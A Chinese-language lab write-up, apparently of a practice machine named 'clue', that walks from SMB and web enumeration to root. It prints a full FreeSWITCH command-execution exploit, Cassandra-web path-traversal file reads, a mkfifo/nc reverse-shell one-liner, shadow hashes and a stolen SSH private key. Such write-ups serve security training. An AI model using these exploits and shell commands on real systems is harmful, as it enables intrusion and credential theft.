&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;729&#34; height=&#34;356&#34; src=&#34;../legacy/uploads/2025/04/1745587019-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1342&#34; srcset=&#34;../legacy/uploads/2025/04/1745587019-image.png 729w, ../legacy/uploads/2025/04/1745587019-image-300x147.png 300w&#34; sizes=&#34;auto, (max-width: 729px) 100vw, 729px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;直接就是无权访问，用ffuf尝试遍历：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://192.168.170.240/FUZZ -fw 770 
&lt;p&gt;backup                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 193ms]
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;找到一个文件夹backup，访问一下也是403 forbidden。端口3000下好像是一个数据库的页面服务：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;570&#34; src=&#34;../legacy/uploads/2025/04/1745587152-image-1024x570.png&#34; alt=&#34;&#34; class=&#34;wp-image-1344&#34; srcset=&#34;../legacy/uploads/2025/04/1745587152-image-1024x570.png 1024w, ../legacy/uploads/2025/04/1745587152-image-300x167.png 300w, ../legacy/uploads/2025/04/1745587152-image-768x428.png 768w, ../legacy/uploads/2025/04/1745587152-image-1536x855.png 1536w, ../legacy/uploads/2025/04/1745587152-image.png 1871w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;谷歌搜了一下发现了这个文章 &lt;a href=&#34;https://jfrog.com/blog/cve-2021-44521-exploiting-apache-cassandra-user-defined-functions-for-remote-code-execution/&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;CVE-2021-44521&lt;/a&gt;, 以及一个github的&lt;a href=&#34;https://github.com/WoodenKlaas/CVE-2021-44521&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;POC&lt;/a&gt;. 手动尝试文章描述的方法，但会提示用户无权限. &lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;581&#34; src=&#34;../legacy/uploads/2025/04/1745587418-image-1024x581.png&#34; alt=&#34;&#34; class=&#34;wp-image-1347&#34; srcset=&#34;../legacy/uploads/2025/04/1745587418-image-1024x581.png 1024w, ../legacy/uploads/2025/04/1745587418-image-300x170.png 300w, ../legacy/uploads/2025/04/1745587418-image-768x436.png 768w, ../legacy/uploads/2025/04/1745587418-image.png 1168w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;（这里截不到显示的信息，总之就是登录的用户cassie无权限&lt;/p&gt;
&lt;p&gt;靶机还开放了SMB服务，用enum4linux扫描一下：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
 enum4linux 192.168.x.240
...
Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        backup          Disk      Backup web directory shares
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
....
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;smb服务允许匿名登录，并发现了一个share &lt;strong&gt;backup&lt;/strong&gt;. 登录并查看：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
smbclient //192.168.170.240/backup
Password for &amp;#x5B;WORKGROUP\kali]:
Try &#34;help&#34; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Fri Aug  5 18:43:50 2022
  ..                                  D        0  Fri Aug  5 18:43:44 2022
  freeswitch                          D        0  Fri Aug  5 18:43:51 2022
  cassandra                           D        0  Sat May  7 01:04:47 2022
&lt;p&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;发现了两个文件夹，下载下来查看:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
smb: \&amp;gt; recurse ON
smb: \&amp;gt; prompt OFF
smb: \&amp;gt; mget *
......
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;手动看了一下，应该是安装的两个软件的备份文件？因为3000端口上运行着cassandra， 8021端口上运行着freeswitch. 在下载下来的文件里发现了freeswitch版本为1.2.7：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;947&#34; height=&#34;609&#34; src=&#34;../legacy/uploads/2025/04/1745588029-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1352&#34; srcset=&#34;../legacy/uploads/2025/04/1745588029-image.png 947w, ../legacy/uploads/2025/04/1745588029-image-300x193.png 300w, ../legacy/uploads/2025/04/1745588029-image-768x494.png 768w&#34; sizes=&#34;auto, (max-width: 947px) 100vw, 947px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;initial-foothold&#34;&gt;Initial Foothold
&lt;/h2&gt;&lt;p&gt;用searchsploit搜一下看有没有对应的exploit:&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;842&#34; height=&#34;238&#34; src=&#34;../legacy/uploads/2025/04/1745588083-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1355&#34; srcset=&#34;../legacy/uploads/2025/04/1745588083-image.png 842w, ../legacy/uploads/2025/04/1745588083-image-300x85.png 300w, ../legacy/uploads/2025/04/1745588083-image-768x217.png 768w&#34; sizes=&#34;auto, (max-width: 842px) 100vw, 842px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;找到了一个1.10.1版本的RCE，复制下来并查看：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: python; title: ; notranslate&#34; title=&#34;&#34;&gt;
#!/usr/bin/python3
&lt;p&gt;from socket import *
import sys&lt;/p&gt;
&lt;p&gt;if len(sys.argv) != 3:
print(&#39;Missing arguments&#39;)
print(&#39;Usage: freeswitch-exploit.py &amp;lt;target&amp;gt; &amp;lt;cmd&amp;gt;&#39;)
sys.exit(1)&lt;/p&gt;
&lt;p&gt;ADDRESS=sys.argv[1]
CMD=sys.argv[2]
PASSWORD=&#39;ClueCon&#39; # default password for FreeSWITCH&lt;/p&gt;
&lt;p&gt;s=socket(AF_INET, SOCK_STREAM)
s.connect((ADDRESS, 8021))&lt;/p&gt;
&lt;p&gt;response = s.recv(1024)
if b&#39;auth/request&#39; in response:
s.send(bytes(f&#39;auth {PASSWORD}\n\n&#39;, &#39;utf8&#39;))
response = s.recv(1024)
print(response)
if b&#39;+OK accepted&#39; in response:
print(&#39;Authenticated&#39;)
s.send(bytes(&#39;api system {}\n\n&#39;.format(CMD), &#39;utf8&#39;))
response = s.recv(8096).decode()
print(response)
else:
print(&#39;Authentication failed&#39;)
sys.exit(1)
else:
print(&#39;Not prompted for authentication, likely not vulnerable&#39;)
sys.exit(1)
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;这个script用默认密码ClueCon来验证后，再尝试执行命令。直接运行一下试试：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
python3 47799.py 192.168.170.240 &amp;#039;whoami&amp;#039;
b&amp;#039;Content-Type: command/reply\nReply-Text: -ERR invalid\n\n&amp;#039;
Authentication failed
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;显示验证失败，应该是密码被改了。看下cassandra有没有exploit:&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;847&#34; height=&#34;181&#34; src=&#34;../legacy/uploads/2025/04/1745588291-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1359&#34; srcset=&#34;../legacy/uploads/2025/04/1745588291-image.png 847w, ../legacy/uploads/2025/04/1745588291-image-300x64.png 300w, ../legacy/uploads/2025/04/1745588291-image-768x164.png 768w&#34; sizes=&#34;auto, (max-width: 847px) 100vw, 847px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;有一个Remote File Read的exploit，复制下来试一下：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
python3 49362.py -p 3000 192.168.170.240 &amp;#039;/etc/passwd&amp;#039;
&lt;p&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:106:113::/nonexistent:/usr/sbin/nologin
cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;能用，发现了用户cassie和anthony. 另外，这个exploit里有提示:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
cat 49362.py 
.....
# Usage
# &amp;gt; cassmoney.py 10.0.0.5 /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# bin:x:2:2:bin:/bin:/usr/sbin/nologin
#
# &amp;gt; cassmoney.py 10.0.0.5 /proc/self/cmdline
# /usr/bin/ruby2.7/usr/local/bin/cassandra-web--usernameadmin--passwordP@ssw0rd
#
# (these creds are for auth to the running apache cassandra database server)
....
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;可以用第二条指令来dump 运行cassandra-web时的用户名和密码，尝试:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
python3 49362.py -p 3000 192.168.170.240 &amp;#039;/proc/self/cmdline&amp;#039;
&lt;p&gt;/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;获得了cassie的密码&lt;strong&gt;SecondBiteTheApple330&lt;/strong&gt;. SSH/22端口开启，尝试以cassie登录:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
ssh cassie@192.168.170.240
cassie@192.168.170.240&amp;#039;s password: 
Permission denied, please try again.
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;失败，可能是不允许cassie ssh登录？尝试用这个密码以Anthony登录看看有没有密码复用，但也失败。&lt;/p&gt;
&lt;p&gt;在下载下来的freeswitch目录下运行grep查找密码：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
freeswitch grep -r password
etc/freeswitch/autoload_configs/event_socket.conf.xml:    &amp;lt;param name=&#34;password&#34; value=&#34;ClueCon&#34;/&amp;gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;发现了这个文件 &lt;strong&gt;event_socket.conf.xml&lt;/strong&gt; 结合上面freeswitch的exploit, &lt;strong&gt;ClueCon&lt;/strong&gt;是这个软件的默认密码，密码应该就保存在这个文件里。我们又可以用另一个cassandra的exploit任意读取文件，那么应该就可以获取正在运行的freeswitch的密码：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
python3 49362.py -p 3000 192.168.170.240 &amp;#039;/etc/freeswitch/autoload_configs/event_socket.conf.xml&amp;#039;
&lt;p&gt;&amp;lt;configuration name=&amp;ldquo;event_socket.conf&amp;rdquo; description=&amp;ldquo;Socket Client&amp;rdquo;&amp;gt;
&amp;lt;settings&amp;gt;
&amp;lt;param name=&amp;ldquo;nat-map&amp;rdquo; value=&amp;ldquo;false&amp;rdquo;/&amp;gt;
&amp;lt;param name=&amp;ldquo;listen-ip&amp;rdquo; value=&amp;ldquo;0.0.0.0&amp;rdquo;/&amp;gt;
&amp;lt;param name=&amp;ldquo;listen-port&amp;rdquo; value=&amp;ldquo;8021&amp;rdquo;/&amp;gt;
&amp;lt;param name=&amp;ldquo;password&amp;rdquo; value=&amp;ldquo;StrongClueConEight021&amp;rdquo;/&amp;gt;
&amp;lt;/settings&amp;gt;
&amp;lt;/configuration&amp;gt;
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;成功获得现在的密码，修改exploit里的密码为StrongClueConEight021并运行：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;859&#34; height=&#34;214&#34; src=&#34;../legacy/uploads/2025/04/1745589040-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1364&#34; srcset=&#34;../legacy/uploads/2025/04/1745589040-image.png 859w, ../legacy/uploads/2025/04/1745589040-image-300x75.png 300w, ../legacy/uploads/2025/04/1745589040-image-768x191.png 768w&#34; sizes=&#34;auto, (max-width: 859px) 100vw, 859px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;成功获得RCE，使用&lt;a href=&#34;https://www.revshells.com/&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;&lt;a class=&#34;link&#34; href=&#34;https://www.revshells.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.revshells.com/&lt;/a&gt;&lt;/a&gt; 生成一个reverse shell，打开监听尝试:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
python3 47799.py 192.168.170.240 &amp;#039;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;1|nc 192.168.45.238 8021 &amp;gt;/tmp/f&amp;#039;
&lt;p&gt;nc -nlvp 8021
listening on [any] 8021 &amp;hellip;
connect to [192.168.45.238] from (UNKNOWN) [192.168.170.240] 41968
sh: 0: can&#39;t access tty; job control turned off
$ id
uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)
$
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;成功获得shell，可以用之前获得的cassie的密码 su到cassie&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
su cassie
Password: SecondBiteTheApple330
id
uid=1000(cassie) gid=1000(cassie) groups=1000(cassie)
&lt;/pre&gt;
&lt;/div&gt;
&lt;h2 id=&#34;root&#34;&gt;Root
&lt;/h2&gt;&lt;p&gt;先用python升级一下shell, 又发现cassie可以以sudo运行/usr/local/bin/cassandra-web, 运行一下看看：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
python -c &amp;#039;import pty; pty.spawn(&#34;/bin/bash&#34;)&amp;#039;
cassie@clue:/$ sudo -l
sudo -l
Matching Defaults entries for cassie on clue:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
&lt;p&gt;User cassie may run the following commands on clue:
(ALL) NOPASSWD: /usr/local/bin/cassandra-web&lt;/p&gt;
&lt;p&gt;cassie@clue:/$ sudo /usr/local/bin/cassandra-web
sudo /usr/local/bin/cassandra-web
I, [2025-04-25T09:54:22.528305 #1828]  INFO &amp;ndash; : Establishing control connection
W, [2025-04-25T09:54:22.530872 #1828]  WARN &amp;ndash; : Host 127.0.0.1 refused all connections
Cassandra::Errors::AuthenticationError: Server requested authentication, but client was not configured to authenticate&lt;/p&gt;
&lt;p&gt;Usage: cassandra-web [options]
-B, &amp;ndash;bind BIND                  ip:port or path for cassandra web to bind on (default: 0.0.0.0:3000)
-H, &amp;ndash;hosts HOSTS                coma-separated list of cassandra hosts (default: 127.0.0.1)
-P, &amp;ndash;port PORT                  integer port that cassandra is running on (default: 9042)
-L, &amp;ndash;log-level LEVEL            log level (default: info)
-u, &amp;ndash;username USER              username to use when connecting to cassandra
-p, &amp;ndash;password PASS              password to use when connecting to cassandra
-C, &amp;ndash;compression NAME           compression algorithm to use (lz4 or snappy)
&amp;ndash;server-cert PATH           server ceritificate pathname
&amp;ndash;client-cert PATH           client ceritificate pathname
&amp;ndash;private-key PATH           path to private key
&amp;ndash;passphrase SECRET          passphrase for the private key
-h, &amp;ndash;help                       Show help
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;看起来可以再运行一个cassandra的服务，并且这个服务是以sudo权限运行的，所以我们应该可以利用这个root权限的服务和之前使用的cassandra的exploit读取任意文件。以sudo开启cassandra服务，并绑定到1234端口：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
cassie@clue:/$ sudo /usr/local/bin/cassandra-web -B 0.0.0.0:1234 -u cassie -p SecondBiteTheApple330
&amp;lt; -B 0.0.0.0:1234 -u cassie -p SecondBiteTheApple330
I, &amp;#x5B;2025-04-25T09:56:21.312344 #1851]  INFO -- : Establishing control connection
I, &amp;#x5B;2025-04-25T09:56:21.389259 #1851]  INFO -- : Refreshing connected host&amp;#039;s metadata
I, &amp;#x5B;2025-04-25T09:56:21.394232 #1851]  INFO -- : Completed refreshing connected host&amp;#039;s metadata
I, &amp;#x5B;2025-04-25T09:56:21.394883 #1851]  INFO -- : Refreshing peers metadata
I, &amp;#x5B;2025-04-25T09:56:21.395813 #1851]  INFO -- : Completed refreshing peers metadata
I, &amp;#x5B;2025-04-25T09:56:21.395838 #1851]  INFO -- : Refreshing schema
I, &amp;#x5B;2025-04-25T09:56:21.423071 #1851]  INFO -- : Schema refreshed
I, &amp;#x5B;2025-04-25T09:56:21.423098 #1851]  INFO -- : Control connection established
I, &amp;#x5B;2025-04-25T09:56:21.423251 #1851]  INFO -- : Creating session
I, &amp;#x5B;2025-04-25T09:56:21.563511 #1851]  INFO -- : Session created
2025-04-25 09:56:21 -0400 Thin web server (v1.8.1 codename Infinite Smoothie)
2025-04-25 09:56:21 -0400 Maximum connections set to 1024
2025-04-25 09:56:21 -0400 Listening on 0.0.0.0:1234, CTRL+C to stop
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里我尝试对端口1234再用49362.py读取文件时，一直卡住，用nmap扫了一下显示端口1234关闭，可能是防火墙拦截了？也许只能从本地访问。看一下49362.py里是如何请求的:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
DT = &amp;#039;../&amp;#039;
DT_NUM = 8
......
                payload = urllib.parse.quote_plus(DT * self.number + self.file)
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;payload就是http://IP:PORT/加上DT_NUM个 &amp;quot; &lt;strong&gt;../&lt;/strong&gt; &amp;ldquo;. 那么我们可以手动在本地请求，用47799再生成一个reverse shell后，请求新开启的cassandra服务:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
cassie@clue:/$ curl --path-as-is 127.0.0.1:1234/../../../../../../../../etc/shadow
&amp;lt;s 127.0.0.1:1234/../../../../../../../../etc/shadow
root:$6$kuXiAC8PIOY2uis9$LrTzlkYSlY485ZREBLW5iPSpNxamM38BL85BPmaIAWp05VlV.tdq0EryiFLbLryvbsGTx50dLnMsxIk7PJB5P1:19209:0:99999:7:::
daemon:*:18555:0:99999:7:::
bin:*:18555:0:99999:7:::
sys:*:18555:0:99999:7:::
sync:*:18555:0:99999:7:::
games:*:18555:0:99999:7:::
man:*:18555:0:99999:7:::
lp:*:18555:0:99999:7:::
mail:*:18555:0:99999:7:::
news:*:18555:0:99999:7:::
uucp:*:18555:0:99999:7:::
proxy:*:18555:0:99999:7:::
www-data:*:18555:0:99999:7:::
backup:*:18555:0:99999:7:::
list:*:18555:0:99999:7:::
irc:*:18555:0:99999:7:::
gnats:*:18555:0:99999:7:::
nobody:*:18555:0:99999:7:::
_apt:*:18555:0:99999:7:::
systemd-timesync:*:18555:0:99999:7:::
systemd-network:*:18555:0:99999:7:::
systemd-resolve:*:18555:0:99999:7:::
messagebus:*:18555:0:99999:7:::
sshd:*:18555:0:99999:7:::
systemd-coredump:!!:18555::::::
ntp:*:19209:0:99999:7:::
cassandra:!:19209:0:99999:7:::
cassie:$6$/WeFDwP1CNIN34/z$9woKSLSZhgHw1mX3ou90wnR.i5LHEfeyfHbxu7nYmaZILVrbhHrSeHNGqV0WesuQWGIL7DHEwHKOLK6UX79DI0:19209:0:99999:7:::
freeswitch:!:19209::::::
anthony:$6$01NV0gAhVLOnUHb0$byLv3N95fqVvhut9rbsrYOVzi8QseWfkFl7.VDQ.26a.0IkEVR2TDXoTv/KCMLjUOQZMMpkTUdC3WIyqSWQ.Y1:19209:0:99999:7:::
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;（注意这里要加上&amp;ndash;path-as-is, 不然curl会把多个../给省略掉）&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;成功读取shadow文件. 可以下anthony home下读取anthony的id_rsa&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
cassie@clue:/$ curl --path-as-is 127.0.0.1:1234/../../../../../../../../home/anthony/.ssh/id_rsa
&amp;lt;34/../../../../../../../../home/anthony/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe
d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM
jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m
B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq
gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/
DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r
acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE
QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws
mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP
HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8
UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y
etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M
mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i
CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+
0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG
Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C
gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG
krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b
yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys
kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU
DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN
Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU
iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;保存到本地，并尝试用anthony登录:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
ssh -i id_rsa anthony@192.168.170.240                           
anthony@192.168.170.240&amp;#039;s password: 
Permission denied, please try again.
anthony@192.168.170.240&amp;#039;s password: 
Permission denied, please try again.
anthony@192.168.170.240&amp;#039;s password: 
anthony@192.168.170.240: Permission denied (publickey,password).
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;但却仍然提示要密码，奇怪了。尝试用root登录:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
ssh -i id_rsa root@192.168.170.240
Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
&lt;p&gt;The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.&lt;/p&gt;
&lt;p&gt;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Apr 29 17:57:54 2024
root@clue:&lt;del&gt;# id
uid=0(root) gid=0(root) groups=0(root)
root@clue:&lt;/del&gt;#
